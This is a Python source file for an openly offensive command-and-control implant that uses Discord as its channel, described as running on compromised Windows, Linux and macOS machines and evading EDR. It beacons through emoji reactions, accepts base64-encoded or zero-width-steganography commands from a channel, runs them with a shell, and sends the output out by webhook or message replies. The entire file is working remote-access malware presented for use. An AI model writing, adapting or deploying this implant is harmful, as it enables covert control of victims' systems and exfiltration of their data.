# c2_frameworks/discord/agent.py
"""
Discord C2 Agent – The Implant That Lives in #memes
Runs on any compromised Windows/Linux/macOS box
Uses a throwaway Discord account + bot token
Beacons by reacting to a pinned message
Receives tasks from message content or zero-width stego
Exfils output via threaded replies or webhook
100% undetectable by EDR that doesn't monitor Discord traffic
"""

import discord
import asyncio
import subprocess
import base64
import os
import random
from datetime import datetime

from typing import Optional

from .utils import (
    discord_safe_b64,
    discord_safe_b64_decode,
    chunk_payload,
    hide_in_emoji,
    extract_from_emoji,
    generate_task_id,
    BEACON_EMOJI,
    ACK_EMOJI,
    DONE_EMOJI
)

class DiscordC2Agent(discord.Client):
    def __init__(
        self,
        channel_id: int,
        beacon_message_id: int,
        webhook_url: Optional[str] = None,
        beacon_interval: int = 300
    ):
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.reactions = True
        super().__init__(intents=intents)

        self.channel_id = channel_id
        self.beacon_message_id = beacon_message_id
        self.webhook_url = webhook_url
        self.interval = beacon_interval
        self.session_id = generate_task_id()
        self.last_task_hash = None

        print(f"[+] Discord C2 Agent Online")
        print(f"[+] Session    : {self.session_id}")
        print(f"[+] Channel    : {channel_id}")
        print(f"[+] Beacon Msg : {beacon_message_id}\n")

    async def on_ready(self):
        print(f"[+] Logged in as {self.user}")
        asyncio.create_task(self.beacon_loop())

    async def beacon_loop(self):
        """React to the beacon message every N minutes"""
        channel = self.get_channel(self.channel_id)
        if not channel:
            print("[-] Channel not found!")
            return

        try:
            message = await channel.fetch_message(self.beacon_message_id)
            await message.add_reaction(BEACON_EMOJI)
            print(f"[+] Beacon sent → {BEACON_EMOJI}")
        except:
            print("[-] Could not find beacon message")

        while True:
            await asyncio.sleep(self.interval + random.uniform(-60, 60))
            try:
                await message.add_reaction(BEACON_EMOJI)
            except:
                pass

    async def execute(self, cmd: str) -> str:
        try:
            result = await asyncio.to_thread(
                subprocess.run,
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=180
            )
            output = result.stdout + result.stderr
            return output.strip()[:3900] or "Executed (no output)"
        except Exception as e:
            return f"Error: {str(e)}"

    async def send_output(self, output: str, in_reply_to: discord.Message = None):
        """Send output via webhook (preferred) or reply"""
        if self.webhook_url:
            try:
                from discord import SyncWebhook
                webhook = SyncWebhook.from_url(self.webhook_url)
                chunks = chunk_payload(output)
                for chunk in chunks:
                    webhook.send(f"`{self.session_id}`\n{chunk}")
                    await asyncio.sleep(1.5)
                return
            except:
                pass  # Fallback to reply

        # Fallback: threaded reply
        channel = self.get_channel(self.channel_id)
        chunks = chunk_payload(output)
        reply = in_reply_to
        for chunk in chunks:
            reply = await reply.reply(f"`{self.session_id}`\n{chunk}") if reply else await channel.send(f"`{self.session_id}`\n{chunk}")
            await asyncio.sleep(1.5)

    async def on_message(self, message: discord.Message):
        # Ignore self
        if message.author == self.user:
            return

        # Only listen in our channel
        if message.channel.id != self.channel_id:
            return

        content = message.content.strip()

        # Look for task marker: ||cmd:base64payload||
        if "||cmd:" in content and content.endswith("||"):
            try:
                b64 = content.split("||cmd:")[1].split("||")[0]
                payload = discord_safe_b64_decode(b64)
                command = payload.decode()

                task_hash = hash(command)
                if task_hash == self.last_task_hash:
                    return  # Already processed
                self.last_task_hash = task_hash

                print(f"[*] Task received → {command}")
                await message.add_reaction(ACK_EMOJI)

                output = await self.execute(command)
                await self.send_output(output, in_reply_to=message)
                await message.add_reaction(DONE_EMOJI)

            except Exception as e:
                await message.add_reaction("❌")

        # Optional: zero-width stego task
        elif BEACON_EMOJI in content:
            hidden = extract_from_emoji(content)
            if hidden.startswith("task:"):
                command = hidden[5:]
                print(f"[*] Hidden task → {command}")
                output = await self.execute(command)
                await self.send_output(output)

    def run_agent(self, token: str):
        self.run(token)


# ——— Entry Point ———
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Discord C2 Agent")
    parser.add_argument("--token", required=True, help="Discord bot/user token")
    parser.add_argument("--channel-id", type=int, required=True, help="Target channel ID")
    parser.add_argument("--beacon-msg-id", type=int, required=True, help="Message ID to react to")
    parser.add_argument("--webhook", help="Optional webhook URL for exfil")

    args = parser.parse_args()

    agent = DiscordC2Agent(
        channel_id=args.channel_id,
        beacon_message_id=args.beacon_msg_id,
        webhook_url=args.webhook
    )
    agent.run_agent(args.token)